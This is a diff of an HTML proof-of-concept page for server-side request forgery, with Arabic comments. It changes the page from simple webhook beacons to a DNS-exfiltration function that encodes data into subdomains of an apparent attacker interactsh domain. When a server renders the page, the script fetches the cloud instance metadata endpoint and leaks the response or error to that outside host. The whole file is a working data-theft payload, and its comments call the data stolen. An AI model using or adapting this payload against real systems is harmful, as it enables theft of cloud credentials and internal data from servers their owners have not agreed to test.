@@ -1,30 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SSRF PoC - Simple HTTP</title>
+    <title>SSRF PoC - Final DNS Exfil</title>
 </head>
 <body>
     <h1>Loading...</h1>
     <script>
-        // رابط Webhook الجديد الخاص بك
-        const WEBHOOK_URL = "a5852858-9701-4e74-896b-ba98539cebed.dnshook.site";
+        // استخدم نطاق interactsh الجديد الخاص بك هنا
+        const ATTACKER_DOMAIN = "nhuxvcmuoqyycrcxbetorlulfeg7opf2m.oast.fun";
 
-        // إرسال طلب POST بسيط
-        fetch(WEBHOOK_URL + "/Stage1-PoC-Loaded", { method: 'POST', mode: 'no-cors', body: 'hello' });
+        function exfiltrate(data) {
+            // تنظيف البيانات لجعلها صالحة كجزء من اسم النطاق
+            let subdomain = data.replace(/[^a-zA-Z0-9-]/g, '.').substring(0, 60);
+            // إنشاء طلب fetch لت déclencher استعلام DNS
+            fetch("http://" + subdomain + "." + ATTACKER_DOMAIN, { mode: 'no-cors' });
+        }
+
+        exfiltrate("Stage1-Code-Loaded-By-Server");
 
         setTimeout(() => {
-            fetch(WEBHOOK_URL + "/Stage2-Attempting-Internal-Fetch", { method: 'POST', mode: 'no-cors', body: 'hello' });
-            fetch('http://169.254.169.254/')
+            exfiltrate("Stage2-Attempting-Internal-Fetch");
+            fetch('http://169.254.169.254/latest/meta-data/')
                 .then(response => response.text())
                 .then(data => {
-                    // إذا نجح، أرسل البيانات
-                    fetch(WEBHOOK_URL + "/Stage3-SUCCESS", { method: 'POST', mode: 'no-cors', body: data });
+                    // إذا نجح، قم بتسريب البيانات المسروقة
+                    exfiltrate("Stage3-SUCCESS-" + data);
                 })
                 .catch(error => {
-                    // إذا فشل، أرسل رسالة الخطأ
-                    fetch(WEBHOOK_URL + "/Stage4-FAILED", { method: 'POST', mode: 'no-cors', body: error.toString() });
+                    // إذا فشل، قم بتسريب رسالة الخطأ
+                    exfiltrate("Stage4-FAILED-" + error.toString());
                 });
-        }, 7000);
+        }, 7000); // انتظر 7 ثوانٍ
     </script>
 </body>
 </html>
